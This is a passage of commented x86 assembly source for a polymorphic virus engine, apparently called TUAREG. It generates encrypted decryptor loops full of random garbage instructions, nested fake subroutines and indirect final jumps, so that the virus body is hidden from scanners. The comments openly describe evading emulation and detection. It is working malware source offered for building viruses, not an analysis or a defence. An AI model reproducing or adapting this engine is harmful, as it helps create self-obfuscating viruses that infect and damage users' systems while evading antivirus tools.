                call    Patch1            ; XOR Index2 with Index1, insert the
                                          ; decryption instruction and mix it
                                          ; with garbage
                mov     dh, [ebp+Index1Register]
                mov     dl, [ebp+Index2Register]
                call    DoXORRegReg       ; XOR again Index2 with Index1
                call    DoRandomGarbage   ; Make garbage
                call    DoRandomGarbage

    @@IFC_Next_02:
;; Now we have to modify Index1 and Index2. Since we can code it interleaved
;; (each modification is composed of two main instructions) the less difficult
;; way to code that is making this. The modification of Index1 is adding a
;; random multiple-of-8 value. The modification of Index2 is adding a random
;; value between 4 and 7. The masking of Index1 is making the instruction
;; AND Index1,Virus_SizePOW2-4, and so is the masking of Index2.
;; Little maths: Since Index1 and Index2 are a random number between 0 and
;; Virus_SizePOW2, when we add a number to them less than Virus_SizePOW2 (as
;; it's the case), the resulting number never will be more than the double of
;; Virus_SizePOW2, so the immediate bit above the highest bit set on
;; Virus_SizePOW2-4 (in this case, due to the fact that Virus_SizePOW2-4 is
;; 7FFCh) is the bit 15. So, if we put in a dword Virus_SizePOW2 - 4 (7FFCh)
;; and we left the bit 15 cleared, we can have the rest of bits (16 to 31) set
;; to a random state, due to the fact that in Index1 and Index2 are going to
;; be always 0. This is a manner of making a confusion of this instruction
;; with the garbage ones, since it's a working mask, but it's random in a
;; great part of the whole dword.
;; So, we select a combination. Between the modification and the masking we
;; insert lots of garbage (as always).
                call    Random
                and     eax, 7
                jz    @@Combination0
                cmp     al, 2
                jb    @@Combination1
                jz    @@Combination2
                cmp     al, 4
                jb    @@Combination3
                jz    @@Combination4
                cmp     al, 6
                jae   @@IFC_Next_02   ; Select up to 6 combinations
@@Combination5: call    ModifyIndex2  ; comb 5: Modify Index2, Modify Index1,
                call    ModifyIndex1  ;         Mask Index1, Mask Index2
                jmp   @@SubComb1
@@Combination0: call    ModifyIndex1  ; comb 0: Modify Index1, Modify Index2,
                call    ModifyIndex2  ;         Mask Index1, Mask Index2
    @@SubComb1: call    MaskIndex1
                call    MaskIndex2
                jmp   @@IFC_Next_03
@@Combination1: call    ModifyIndex1  ; Comb 1: Modify Index1, Mask Index1,
                call    MaskIndex1    ;         Modify Index2, Mask Index2
                call    ModifyIndex2
                call    MaskIndex2
                jmp   @@IFC_Next_03
@@Combination2: call    ModifyIndex1  ; Comb 2: Modify Index1, Modify Index2,
                call    ModifyIndex2  ;         Mask Index2, Mask Index1
                jmp   @@SubComb2
@@Combination3: call    ModifyIndex2  ; Comb 3: Modify Index2, Mask Index2,
                call    MaskIndex2    ;         Modify Index1, Mask Index1
                call    ModifyIndex1
                call    MaskIndex1
                jmp   @@IFC_Next_03
@@Combination4: call    ModifyIndex2  ; Comb 4: Modify Index2, Modify Index1,
                call    ModifyIndex1  ;         Mask Index2, Mask Index1
    @@SubComb2: call    MaskIndex2
                call    MaskIndex1

;; When we arrive here, the code to decrypt is already coded. Now we have to
;; test if we decrypted all the virus body or we have to continue decrypting.
     @@IFC_Next_03:
                call    DoCMP    ; Do a CMP Index2,InitialValue (or similar)
                call    RandomFlags ; JNZ to loop or JZ/JMP?
                jz    @@MakeJZ      ; Jump to use JZ
           ; We make: JNZ Loop
                mov     ax, 850Fh ; Insert a JNZ.
                stosw       ; Store the opcode of JNZ
    @@CompleteJZ_JNZ:
                mov     eax, [ebp+JumpsToCompleteNdx]
                mov     [ebp+eax+JumpsToComplete], edi ; Insert the jump
                add     edi, 4                         ; address and increase
                add     eax, 4                         ; the index
                mov     [ebp+JumpsToCompleteNdx], eax
                call    DoRandomGarbage
                call    DoRandomGarbage       ; Make garbage
                call    DoFinalJMP       ; Make the jump to the decrypted part
                jmp   @@ContinueWithFunctionalCode
           ; We make: JZ Etiq1 / Garbage / JMP Loop / Etiq1: xxx
    @@MakeJZ:   mov     al, 74h ; Store the opcode of JZ (short)
                stosb
                inc     edi     ; Make size for displacement
    @@MakeJZ_000:
                push    dword ptr [ebp+CallsLevel1Ndx] ; Save CALLs indexes
                push    dword ptr [ebp+CallsLevel2Ndx] ; just in case we have
                push    dword ptr [ebp+CallsLevel3Ndx] ; to repeat the garbage
                                                       ; making
                jmp   @@MakeJZ_001     ; Jump to continue
    @@MakeJZ_003:
                sub     edi, 5         ; Eliminate the size of the "JMP Loop"
    @@MakeJZ_001:
                mov     esi, edi        ; Save current insertion address
                call    DoRandomGarbage ; Make garbage
                add     edi, 5          ; Add jump size
                sub     esi, edi        ; Get the size of displacement for JZ
                neg     esi
                cmp     esi, 5          ; Displacement = size of JMP?
                jbe   @@MakeJZ_003      ; If it is, repeat (no garbage made)
                cmp     esi, 7Fh        ; under the maximum displacement?
                jbe   @@MakeJZ_OK       ; If it's below or equal, jump
                pop     dword ptr [ebp+CallsLevel3Ndx] ; We have to repeat the
                pop     dword ptr [ebp+CallsLevel2Ndx] ; garbage (too many),
                pop     dword ptr [ebp+CallsLevel1Ndx] ; so we restore the in-
                                       ; dexes of the calls to eliminate any
                                       ; posible call made during this garbage
                                       ; creation
                sub     edi, esi       ; Restore EDI
                jmp   @@MakeJZ_000     ; Jump and loop
   @@MakeJZ_OK: pop     eax        ; Eliminate the saved call indexes, since
                pop     eax        ; the garbage is made correctly
                pop     eax
                mov     eax, esi   ; Get the displacement in EAX
                neg     esi        ; Get the index adding in ESI
                mov     byte ptr [edi+esi-1], al ; Complete the JZ
                sub     edi, 5     ; Make the JMP
                mov     al, 0E9h   ; Opcode of JMP
                stosb              ; Store the opcode
                jmp   @@CompleteJZ_JNZ ; Jump to save the address for later
                                       ; completion 

;; Since the function Branching is recursive, after this code will be other
;; branches and "functional code". This means that if we put in this point the
;; subroutines that we want to create, they'll be between code, not at the
;; beginning or at the end of the decryptor, technique that increases the
;; polymorphysm of the engine alot.

    @@ContinueWithFunctionalCode:
                xor     ecx, ecx
                call    CompleteCalls ; Complete calls of level 1
                mov     ecx, 84h
                call    CompleteCalls ; Complete calls of level 2
                mov     ecx, 84h*2
                call    CompleteCalls ; Complete calls of level 3

    @@Completed:
                mov     dword ptr [ebp+CallsLevel1Ndx], 0 ; Release must-be-
                mov     dword ptr [ebp+CallsLevel2Ndx], 0 ; created calls
                mov     dword ptr [ebp+CallsLevel3Ndx], 0

                mov     byte ptr [ebp+GarbageRecursivity], 0 ; Clear garbage
                                                ; recursivity set on the func-
                                                ; tion CompleteCalls
                inc     byte ptr [ebp+BranchIdentifier]
                ret    ; Return from the Branch
Branching       endp

;; Conditional jumps table
Op_CJumps  db      88h, 89h, 82h, 86h, 87h, 83h, 8Fh, 8Ch, 8Dh, 8Eh, 84h, 85h
           ;;      JS,  JNS, JB,  JBE, JA,  JAE, JG,  JL,  JGE, JLE, JZ,  JNZ

ArrayOfCalls1   dd      20h dup (0)  ; Place to put the addresses to the
ArrayOfCalls1Ndx dd     0            ; created subroutines. There are three
ArrayOfCalls2   dd      20h dup (0)  ; levels, being the first level callable
ArrayOfCalls2Ndx dd     0            ; from the first recursivity level of
ArrayOfCalls3   dd      20h dup (0)  ; garbage, and so on. Once in a subrouti-
ArrayOfCalls3Ndx dd     0            ; ne they only can call a subroutine of
                                     ; a higher level, to avoid inter-calls
                                     ; that would make the decryptor to not
                                     ; work (CALL_1 calls internally to CALL_2
                                     ; and CALL_2 calls CALL_1, for example).
DoNormalCall    db      0 ; This flag puts at the beginning of the call the
                          ; instructions PUSH EBP/MOV EBP,ESP, simulating the
                          ; creation of a stack frame. In this version of the
                          ; TUAREG isn't used, but externally seems a high
                          ; level function.
CallsLevel1     dd      20h dup (0)  ; This variables are used to store the
CallsLevel1Ndx  dd      0            ; address in the being-constructed de-
CallsLevel2     dd      20h dup (0)  ; cryptor where a CALL is. Later, when
CallsLevel2Ndx  dd      0            ; the branch is finished, we determine
CallsLevel3     dd      20h dup (0)  ; randomly if we use an already created
CallsLevel3Ndx  dd      0            ; subroutine or we create a new one.

;; This function completes the CALLs pointed by the addresses in the arrays
;; above. Depending on the level of recursivity, we stored the address of that
;; CALL instruction in one of the levels. When we call to this function, de-
;; pending on the value in ECX, we complete them pointing to a created subrou-
;; tine (stored in ArrayOfCallsX) or we create a new subroutine and store the
;; address to that new one into ArrayOfCallsX.
;; ECX=0 for Calls level 1, ECX=84h for Calls level 2, ECX=84h*2 for level 3
CompleteCalls   proc
                mov     edx, [ebp+ecx+CallsLevel1Ndx]
                shr     edx, 2    ; Get the number of calls to complete
                push    ecx
                and     cl, 0Fh
                shr     cl, 2
                inc     ecx
                mov     byte ptr [ebp+GarbageRecursivity], cl ;Set the garbage
                                                 ; recursivity (calls of level
                                                 ; 3 can't do any CALL, to
                                                 ; avoid too much recursivity)
                pop     ecx
  @@CompleteCalls:
                dec     edx          ; Have we completed all the calls?
                js    @@Completed    ; If yes, we end
                cmp     dword ptr [ebp+ecx+ArrayOfCalls1Ndx], 0 ; Are there
                                                    ; any created subroutine?
                jz    @@CreateCall  ; If not, create a new one directly
                call    RandomFlags ; Get random flags
                jz    @@CreateCall  ; Create a call with a 50% of probability
    @@AnotherRandom:
                call    Random
                and     eax, 3Ch
                cmp     eax, [ebp+ecx+ArrayOfCalls1Ndx]
                jae   @@AnotherRandom    ; Get a random address from the list
                                         ; of created subroutines
                add     ebp, ecx
                mov     esi, [4*edx+ebp+CallsLevel1]
                lea     ebx, [esi+4]
                sub     ebx, [ebp+eax+ArrayOfCalls1]
                neg     ebx        ; EBX=Displacement from the created subrou-
                                   ; tine to the CALL instruction
                mov     [esi], ebx ; Complete CALL
                sub     ebp, ecx      ; Restore delta offset
                jmp   @@CompleteCalls ; Loop

       @@CreateCall:
                cmp     dword ptr [ebp+ecx+ArrayOfCalls1Ndx], 80h ; If there are
                jz    @@AnotherRandom    ; too much created subroutines, jump
                                         ; to use any created one
                add     ebp, ecx
                mov     esi, [4*edx+ebp+CallsLevel1] ; Get the address to the
                lea     ebx, [esi+4]                 ; CALL to complete
                sub     ebx, edi
                neg     ebx
                mov     [esi], ebx
                sub     ebp, ecx

                call    CreateCALL                

                jmp   @@CompleteCalls ; Loop
    @@Completed:
                ret           ; Return from function
CompleteCalls   endp

CreateCALL      proc
                add     ebp, ecx    ; Fix delta offset (we can't put three
                                    ; registers inside the brackets :P)
                mov     ebx, [ebp+ArrayOfCalls1Ndx]
                mov     [ebp+ebx+ArrayOfCalls1], edi ; Now, set the address of
                add     ebx, 4                  ; storage (EDI) into the array
                mov     [ebp+ArrayOfCalls1Ndx], ebx  ; of created subroutines
                sub     ebp, ecx     ; Restore delta offset
 @@AgainCalls:  call    RandomFlags
                jz    @@NormalCall
                js    @@NormalCall   ; Simulate a stack frame with a 25% of
                                     ; probability
                cmp     byte ptr [ebp+KeyRegister], 5
                jz    @@NormalCall
                mov     byte ptr [ebp+DoNormalCall], 0
                mov     al, 55h      ; Insert PUSH EBP/MOV EBP,ESP
                stosb
                mov     ax, 0EC8Bh
                stosw
                jmp   @@NotNormalCall
   @@NormalCall:
                mov     byte ptr [ebp+DoNormalCall], 1
   @@NotNormalCall:
                mov     esi, edi     ; ESI=Address of storage
             ;   cmp     byte ptr [ebp+GarbageRecursivity], 2
             ;   jnz   @@SetNormalGarbage
             ;   mov     byte ptr [ebp+SpecialGarbage], 1
             ;   jmp   @@ContinueWithCALLContents
     @@SetNormalGarbage:
                mov     byte ptr [ebp+SpecialGarbage], 0
     @@ContinueWithCALLContents:
                call    DoRandomGarbage  ; Make a lot of garbage inside the
                call    DoRandomGarbage  ; subroutine (included CALLs to other
                call    DoRandomGarbage  ; subroutines, depending on the re-
                call    DoRandomGarbage  ; cursivity level)
                mov     byte ptr [ebp+SpecialGarbage], 0
                cmp     esi, edi         ; Test if EDI has grown (void subrou-
                                         ; tine)
                jz    @@NotNormalCall ;If it's void, repeat garbage generation
                cmp     byte ptr [ebp+DoNormalCall], 1
                jz    @@EndCall    ; If there is a stack frame simulation...
                mov     al, 5Dh    ; ...store POP EBP
                stosb
    @@EndCall:  mov     al, 0C3h 
                stosb              ; Store RET
                ret
CreateCALL      endp

PreCreateCALLs  proc
                xor     ecx, ecx
                mov     eax, 10h
                mov     byte ptr [ebp+GarbageRecursivity], 1
      @@MakeAnother:
                push    eax
                call    RandomFlags
                jz    @@DontMake
                call    CreateCALL
   @@DontMake:  pop     eax
                dec     eax
                jnz   @@MakeAnother
                mov     byte ptr [ebp+GarbageRecursivity], 0
                ret
PreCreateCALLs  endp

BifurcationNumber db    0  ; Number of recursivity for the function Branching
SpecialGarbage  db      0


JumpingArray    dd      10h dup (0) ; Array of possible target addresses to
JumpingArrayNdx dd      0           ; jump randomly to loop
JumpsToComplete dd      10h dup (0) ; Array where the looping jump addresses
JumpsToCompleteNdx dd   0           ; are stored for later completion

TouchedRegisters db     9 dup (0)   ; Flags of "touched", for registers

;; This address selects any register which isn't ESP. If the selected register
;; hasn't the "touched" flag actived, the register is initialized with DoMOV
;; using a random value. Moreover, the function (as SelectARegister and
;; SelectARegisterWithInit) saves the last register returned, so the next call
;; to this functions won't return the same register as the time before.
SelectAnyRegisterWithInit proc
       @@Other: call    Random
                and     al, 7
                cmp     al, 4
                jz    @@Other
                cmp     al, byte ptr [ebp+RegisterSelectedB4]
                jz    @@Other ; Select a random between 0 and 7 with isn't
                              ; ESP nor the last selected register
   SelectReg_Common:
                and     eax, 0FFh
                cmp     byte ptr [ebp+eax+TouchedRegisters], 1
                jz    @@OK    ; If the register is "touched", jump
                cmp     byte ptr [ebp+KeyRegister], al
                jz    @@Other
                push    edx
                push    eax
                mov     dl, al
                call    Random
                call    DoMOV   ; Initialize the register with a random value
                pop     eax
                pop     edx
                mov     byte ptr [ebp+eax+TouchedRegisters], 1 ; Set the reg.
                                                               ; as "touched"
       @@OK:    mov     byte ptr [ebp+RegisterSelectedB4], al ; Save it as the
                                                           ; "selecter before"
                ret     ; Return
SelectAnyRegisterWithInit endp

RegisterSelectedB4      db      0  ; Place where we save the last selected
                                   ; register

;; This function selects a register which is not Index1, Index2, Key or
;; Buffer (a register to use with garbage). If the register isn't "touched",
;; the register is initialized to a random value with a MOV or similar.
SelectARegisterWithInit proc
                call    SelectARegister ; Call to the register selection
                jmp     SelectReg_Common ; Jump to the register initialization
                                         ; common part of the function above
SelectARegisterWithInit endp

;; This function makes the instructions to modify the Index1 register
ModifyIndex1    proc
                mov     dl, [ebp+Index1Register]
                mov     eax, [ebp+Index1Modifier]
  ModifyNdxReg: call    DoADD
                call    DoRandomGarbage
                call    DoRandomGarbage
                ret
ModifyIndex1    endp

;; This function makes the instructions to modify the Index2 register
ModifyIndex2    proc
                mov     dl, [ebp+Index2Register]
                mov     eax, [ebp+Index2Modifier]
                jmp     ModifyNdxReg
ModifyIndex2    endp

;; This function makes the instructions to mask the Index1 with AND
MaskIndex1      proc
                mov     ecx, Virus_SizePOW2
                call    Random
                and     eax, 3
                inc     eax
                sub     ecx, eax
                call    Random
                and     eax, NOT(Virus_SizePOW2 - 1)
                and     eax, NOT(Virus_SizePOW2)
                or      ecx, eax     ; ECX=The pure mask with random bits
                                     ; where in the register to mask will be
                                     ; always 0
                mov     dl, [ebp+Index1Register]
    MaskNdxReg: or      dl, dl
                jz    @@EAX
                mov     ax, 0E081h   ; AND Reg,Value
                or      ah, dl
                stosw                ; Store the opcode
                jmp   @@InsertValue
       @@EAX:   mov     al, 25h      ; AND EAX,Value
                stosb                ; Store the opcode
@@InsertValue:  xchg    ecx, eax
                stosd                ; Store the masking value
                call    DoRandomGarbage  ; Make garbage
                call    DoRandomGarbage
                ret                  ; Return
MaskIndex1      endp

;; This function makes the instructions to mask the Index2 with AND
MaskIndex2      proc
                mov     ecx, Virus_SizePOW2 - 4
                call    Random
                and     eax, NOT(Virus_SizePOW2 - 1)
                and     eax, NOT(Virus_SizePOW2)
                or      ecx, eax
                mov     dl, [ebp+Index2Register] ; ECX=Mask with random bits
                                                 ; where in the register to
                                                 ; mask will be 0
                jmp     MaskNdxReg ; Jump to the common part
MaskIndex2      endp

;; This function is common when doing the "functional" code in the branch.
;; What it does is to XOR the Index2 with the Index1, do garbage, make the
;; code to decrypt and do more garbage.
Patch1          proc
                mov     dh, [ebp+Index1Register]
                mov     dl, [ebp+Index2Register]
                call    DoXORRegReg
                call    DoRandomGarbage
                call    DoRandomGarbage
                call    InsertDecryption
                call    DoRandomGarbage
                call    DoRandomGarbage
                ret
Patch1          endp

;; This function construct code for the decryption operation. It can make a
;; wide variety of methods, using one or two registers inside the brackets,
;; and using a direct value or a register to decrypt. The decryption is XOR,
;; ADD or SUB. No in vane, it's one of the largest functions in this engine.
InsertDecryption proc
                test    byte ptr [ebp+TuaregFlags], 1 ; Use register for key?
                jz    @@WithKeyReg                    ; Then jump to there

    ;; Here we'll construct a XOR/ADD/SUB DWORD PTR [Address], DirectValue
                cmp     byte ptr [ebp+EncryptType], 1 ; Make XOR, ADD or SUB
                jb    @@PutSUBValue
                jz    @@PutADDValue
 @@PutXORValue: mov     ah, 0B0h     ; XOR 2nd opcode
                jmp   @@PutValue
 @@PutSUBValue: mov     ah, 0A8h     ; SUB 2nd opcode
                jmp   @@PutValue
 @@PutADDValue: mov     ah, 80h      ; ADD 2nd opcode (the instruction is re-
                                     ; presented on the bits 6-5-4). And we
                                     ; set the two highest bits to 1-0, to
                                     ; activate a dword adding to the register
                                     ; inside the brackets
    @@PutValue: mov     al, 81h      ; Main opcode
                test    byte ptr [ebp+TuaregFlags], 6 ; Use buffer register?
                jnz   @@NoBufferReg          ; If not, use Index2
      ;; Here we made XOR/ADD/SUB DWORD PTR [BufferReg+AddingValue], KeyValue
      @@WithBufferReg:
                or      ah, byte ptr [ebp+BufferRegister] ; Select buffer reg.
                call    RandomFlags   ; Do we modify the buffer register B4?
                jz    @@NoAdditionalAddition ; If not, store directly the
                                           ; encrypted data begin address as
                                           ; addition
                push    eax      ; Save opcode
                call    Random   ; Get a random value
                mov     dl, byte ptr [ebp+BufferRegister] ;Get the buffer reg.
                call    DoADD   ; Do an ADD Reg,Value instruction (or similar)
                call    DoRandomGarbage ; to add a random value, and some gar-
                                        ; bage
                pop     ebx
                xchg    ebx, eax ; EAX=Opcode, EBX=Additional addition
                stosw            ; Store opcode
                mov     eax, [ebp+EncryptedDataBeginAddress] ; Subtract to the
                sub     eax, ebx    ; address addition the random ADDed to the
                stosd               ; buffer register and store it as addition
                jmp   @@Next_01     ; inside the brackets, and jump
      @@NoAdditionalAddition:
                stosw               ; Store the opcode
                mov     eax, [ebp+EncryptedDataBeginAddress] ; Store this
                stosd               ; address directly (without modifications)
                jmp   @@Next_01     ; Jump
      @@NoBufferReg:
                or      ah, byte ptr [ebp+Index2Register] ; Bind the reg. to
                                                          ; the opcode
                call    RandomFlags         ; Randomly select if we modify the
                jz    @@NoAdditionalAddition ;addition or we store the decrypt
                                             ; data begin address directly
                test    byte ptr [ebp+TuaregFlags], 2 ; PUSH/Decrypt/POP?
                jnz   @@UseBufferRegister    ;  If not, we modify buffer reg
                call    RandomFlags       ; Randomly we select to modify the
                jz    @@UseBufferRegister ; buffer register or Index2 register
                                          ; (since we push it and pop it later,
                                          ; we can modify it)
          @@UseIndexRegister:
                push    eax
                call    Random   ; Get a random value to add
                mov     dl, byte ptr [ebp+Index2Register]
                call    DoADD           ; Make an ADD with that random value
                call    DoRandomGarbage ; Make garbage
                pop     ebx
                xchg    ebx, eax
                stosw                   ; Store the opcode
                mov     eax, [ebp+EncryptedDataBeginAddress]
                sub     eax, ebx        ; Adjust the addition
                stosd                   ; Store the addition
                jmp   @@Next_01         ; Jump to complete the instruction
   ;; Here we are going to make a MOV BufferReg,RandomValue. Then, inside the
   ;; decryption instruction, we'll use double index instead one index:
   ;; XOR/ADD/SUB DWORD PTR [Index2Reg+BufferReg+Dword_Addition], KeyValue
          @@UseBufferRegister:
                push    eax
                call    Random          ; Get a random value
                mov     dl, byte ptr [ebp+BufferRegister]
                call    DoMOV        ; Move that value to the buffer register
                call    DoRandomGarbage ; Make garbage
                mov     ebx, eax
                pop     eax             ; Pop the opcode
                and     ah, 0F8h  ; Recode the 2nd opcode to insert a 3rd
                or      ah, 4
                stosw             ; Store the opcode
                mov     dh, byte ptr [ebp+Index2Register] ; Get the Index2
                call    RandomFlags ; 50% of probability to jump
                setz    cl
                jz    @@RJ_01
                xchg    dh, dl    ; Exchange the two registers (the order
                                  ; doesn't matter)
       @@RJ_01: shl     dl, 3     ; Construct the opcode using the Index2 reg
                mov     al, dh    ; and the buffer reg
                or      al, dl
                or      cl, cl
                jz    @@RJ_99
                push    eax
                call    Random
                and     al, 3
                mov     cl, al
                mov     eax, [ebp+EncryptedDataBeginAddress]
                shl     ebx, cl
                sub     eax, ebx
                mov     ebx, eax
                pop     eax
                ror     cl, 2
                or      al, cl
                stosb
                jmp   @@RJ_98
       @@RJ_99: stosb             ; Store the third opcode
                mov     eax, [ebp+EncryptedDataBeginAddress]
                sub     eax, ebx        ; Calculate the addition
                mov     ebx, eax
       @@RJ_98: mov     eax, ebx
                stosd             ; Store the addition
     @@Next_01:
                mov     eax, [ebp+DecryptKey] ; Get the decryption key and
                jmp   @@IFC_Next_01           ; jump to store it.

 ;; Here we use a key register, that's it:
 ;; XOR/ADD/SUB [Register1+(opt.Register2+)AdditionValue],KeyRegister
 @@WithKeyReg:  cmp     byte ptr [ebp+EncryptType], 1
                jb    @@PutSUBReg
                jz    @@PutADDReg
   @@PutXORReg: mov     al, 31h ; XOR opcode
                jmp   @@PutReg
   @@PutADDReg: mov     al, 01h ; ADD opcode
                jmp   @@PutReg
   @@PutSUBReg: mov     al, 29h ; SUB opcode. This time this is the first op-
                                ; code
    @@PutReg:   mov     ah, 80h ; Set dword addition in the 2nd opcode
                test    byte ptr [ebp+TuaregFlags], 6 ; Buffer register?
                jnz   @@NoBufferReg2     ; If not, jump
   ;; This time we made:
   ;; XOR/ADD/SUB [BufferReg+Addition],KeyRegister
      @@WithBufferReg2:
                mov     dh, [ebp+BufferRegister] ; Get the buffer register
                call    RandomFlags  ; Do we modify the addition?
                jz    @@Next_02      ; Jump if we store the decrypt data begin
                                     ; address directly
                push    edx
                push    eax
                call    Random     ; Get a random value to ADD
                mov     dl, byte ptr [ebp+BufferRegister]
                call    DoADD      ; Construct an ADD (or similar) with the
                                   ; buffer register and the random value
                call    DoRandomGarbage ; Make garbage
                pop     ebx
                xchg    ebx, eax
                pop     edx
                mov     dl, [ebp+KeyRegister] ; Get the key register
                shl     dl, 3       ; Construct the second opcode with the
                or      ah, dl      ; buffer register and the key register
                or      ah, dh
                stosw               ; Store the opcode
                mov     eax, [ebp+EncryptedDataBeginAddress] ; Calculate the
                sub     eax, ebx     ; addition after the ADD
                jmp   @@IFC_Next_01  ; Jump to store it and finish

   ;; Here we can construct an instruction similar to the above but using
   ;; Index2 or use Index2 and BufferReg as a two-index memory reference.
      @@NoBufferReg2:
                mov     dh, [ebp+Index2Register]
                call    RandomFlags  ; Randomly jump to complete the instruc-
                jz    @@Next_02      ; tion directly
                test    byte ptr [ebp+TuaregFlags], 2 ; Double XORing?
                jnz   @@UseBufferRegister2 ; If so, use only buffer register
                call    RandomFlags  ; Select if we use only Index2 or buffer
                jz    @@UseBufferRegister2 ; too
      ;; Here we construct:
      ;; XOR/ADD/SUB [Index2+Addition],KeyRegister
          @@UseIndexRegister2:
                push    edx
                push    eax
                call    Random
                mov     dl, byte ptr [ebp+Index2Register]
                call    DoADD   ; Modify the Index2 with an ADD
                call    DoRandomGarbage  ; Make garbage
                pop     ebx
                xchg    ebx, eax
                pop     edx
                mov     dl, [ebp+KeyRegister]
                shl     dl, 3
                or      ah, dl
                or      ah, dh
                stosw          ; Construct the opcode of the instruction
                mov     eax, [ebp+EncryptedDataBeginAddress] ; Calculate the
                sub     eax, ebx      ; addition and jump to store it
                jmp   @@IFC_Next_01
    ;; Here we are going to use the buffer register and the Index2 register.
    ;; As before, we'll use the buffer register with a random value instead
    ;; of adjusting the addition, so the relative address will be represented
    ;; in two registers plus a dword addition.
          @@UseBufferRegister2:
                push    eax
                call    Random
                mov     dl, byte ptr [ebp+BufferRegister]
                call    DoMOV    ; Make a MOV BufferReg,RandomValue (or simi-
                call    DoRandomGarbage ; lar) and some garbage
                pop     ebx
                xchg    ebx, eax
                mov     ah, 84h       ; Fixed (agh) 2nd opcode, which signali-
                                      ; ces dword addition and the use of a
                                      ; third opcode
                mov     dl, [ebp+KeyRegister]
                shl     dl, 3
                or      ah, dl       ; Set the key register
                stosw                ; Store the opcode
                mov     dl, [ebp+BufferRegister]
                mov     dh, [ebp+Index2Register]
                call    RandomFlags
                setz    cl
                jz    @@RJ_02
                xchg    dh, dl
       @@RJ_02: shl     dl, 3
                mov     al, dh      ; Now construct the third opcode, which
                or      al, dl      ; means (with the 2nd) [Reg1+Reg2+Value]
                or      cl, cl
                jz    @@RJ_97
                push    eax
                call    Random
                and     al, 3
                mov     cl, al
                pop     eax
                shl     ebx, cl
                ror     cl, 2
                or      al, cl
       @@RJ_97: stosb
                mov     eax, [ebp+EncryptedDataBeginAddress]
                sub     eax, ebx    ; Construct the addition...
                jmp   @@IFC_Next_01 ; ...and jump to store it

   ;; Here to put directly the decryption address added to the index register
     @@Next_02: mov     dl, [ebp+KeyRegister]
                shl     dl, 3
                or      ah, dl   ; Bind the registers to the opcode
                or      ah, dh
                stosw            ; Store the opcode
                mov     eax, [ebp+EncryptedDataBeginAddress] ; Get the addr.
    @@IFC_Next_01:
                stosd         ; Store it
                call    DoRandomGarbage  ; Make garbage
                call    DoRandomGarbage
                ret                      ; Return
InsertDecryption endp

;; Final jump to the decrypted part. With also a wide variety of methods, with
;; this there isn't a direct jump to the decrypted part, so the decryptor has
;; to be emulated completely to know where the decryptor jumps after the work
;; is done. Hahahahahahahaha! (devilish laugh :)
DoFinalJMP      proc
;; Ways of jumping to the decrypted part:
; Common entry:
; MOV [Address], Value (in many and variated types)
; (optional) XOR/ADD/SUB [Address], Value
;; Jump:
; JMP [Address]
; PUSH [Address] / RET
; MOV Reg,[Address] / JMP Reg
; MOV Reg,Address / JMP [Reg]
;; In the common entry, the value and or the memory address can be in regis-
;; ters (the value is moved to a random register before using that value).

                pushad          ; Undocumented instruction :P
    @@Repeat:   call    SelectOnlyTwoRegs ; It changes the reserve of four re-
                                        ; gisters to only two (no more needed)
                mov     ebx, [ebp+ReservedBssAddress] ; We reserved this addr.
                                ; to avoid that the calling to DoRandomGarbage
                                ; overwrites the data that we put here while
                                ; the decryptor is running.
                mov     eax, [ebp+EncryptedDataBeginAddress]
                call    DoMOVMemValue
      @@Next:   call    DoRandomGarbage   ; Make garbage
                call    DoRandomGarbage
                call    SelectOnlyTwoRegs ; Reselect two registers and put
                                          ; them as "reserved"
                mov     dl, [ebp+Index1Register]
                call    Random    ; Get the way of jumping to the address in
                and     al, 3     ; our variable
                jz    @@JMP__     ; Make JMP [Memory_Address]
                cmp     al, 2
                jb    @@PUSH__RET ; Make PUSH [Memory_Address]/RET
                jz    @@MOV__JMP  ; Make MOV Reg,[Memory_Address]/JMP Reg
        ; Make MOV Reg,Memory_Address/JMP [Reg]
   @@MOVJMP__:  call    RandomFlags
                setz    cl
                jz    @@MJ__Direct01
                call    Random
                sub     ebx, eax
                jmp   @@MJ__Direct03
      @@MJ__Direct01:
                mov     eax, ebx         ; EAX=Reserved memory address
      @@MJ__Direct03:
                call    DoMOV
                call    DoRandomGarbage
                call    DoRandomGarbage
                or      cl, cl
                jnz   @@MJ__Direct02
                mov     ax, 0A0FFh
                or      ah, dl
                stosw
                mov     eax, ebx
                stosd
                jmp   @@Return
   @@MJ__Direct02:
                cmp     dl, 5      
                jz    @@MJ__EBP        ; If the reserved register is EBP, jump
                mov     ax, 20FFh   ; Opcode of JMP [Reg]
                or      ah, dl      ; Set the used register
                stosw               ; Insert the instruction
                jmp   @@Return      ; Return
       @@MJ__EBP:
                mov     ax, 65FFh   ; We have to store JMP [EBP+00], so we do
                stosw               ; it (a single EBP can't go alone, since
                xor     al, al      ; 5 is the identifier of a direct memory
                stosb               ; address)
                jmp   @@Return      ; Return

         ;; MOV Reg,[Memory_Address]/JMP Reg
   @@MOV__JMP:  mov     dl, [ebp+Index1Register] ; Get the reserved register
                call    DoMOVRegMem
                call    DoRandomGarbage  ; Make garbage
                call    DoRandomGarbage
                mov     ax, 0E0FFh    ; Opcode of JMP Reg
                or      ah, dl        ; Set the register in the opcode
                stosw                 ; Store the opcode
                jmp   @@Return        ; Return

           ;; PUSH [Memory_Address]/RET
   @@PUSH__RET: call    DoPUSHMem
                call    DoRandomGarbage
                call    DoRandomGarbage
                mov     al, 0C3h   ; AL=opcode of RET
                stosb              ; Store it
                jmp   @@Return     ; Return

           ;; JMP [Memory_Address]
   @@JMP__:     call    RandomFlags
                jz    @@JMP__Direct
                call    Random
                sub     ebx, eax
                call    DoMOV
                call    DoRandomGarbage
                call    DoRandomGarbage
                mov     ax, 0A0FFh
                or      ah, dl
                jmp   @@Store_01
   @@JMP__Direct:
                mov     ax, 25FFh ; AX=opcode of JMP [Memory_Address]
    @@Store_01: stosw             ; Store it
                mov     eax, ebx
                stosd            ; Complete the opcode with the memory address
              ;  jmp   @@Return

   @@Return:    mov     eax, dword ptr [ebp+CopyOfUsedRegisters]
                mov     dword ptr [ebp+Index1Register], eax ; Restore the re-
                                                            ; served registers
                mov     [esp+S_EDI], edi ; Replace EDI in the stack
                popad             ; Restore registers
                ret               ; Return
DoFinalJMP      endp

;; This function selects two registers from Index1, Index2 or Counter, and
;; sets them on Index1. The key register remains unchanged, since it's needed
;; for the indexed memory accesses, due to the fact that its value never
;; changes.
SelectOnlyTwoRegs proc
                push    eax
                push    edx
     @@OtherRandom:
                call    Random      ; Get a random value from 0 to 3
                and     eax, 03h
                cmp     al, 2       ; Key register?
                jz    @@OtherRandom ; If so, then get another random
                mov     al, byte ptr [ebp+eax+CopyOfUsedRegisters] ; Get the
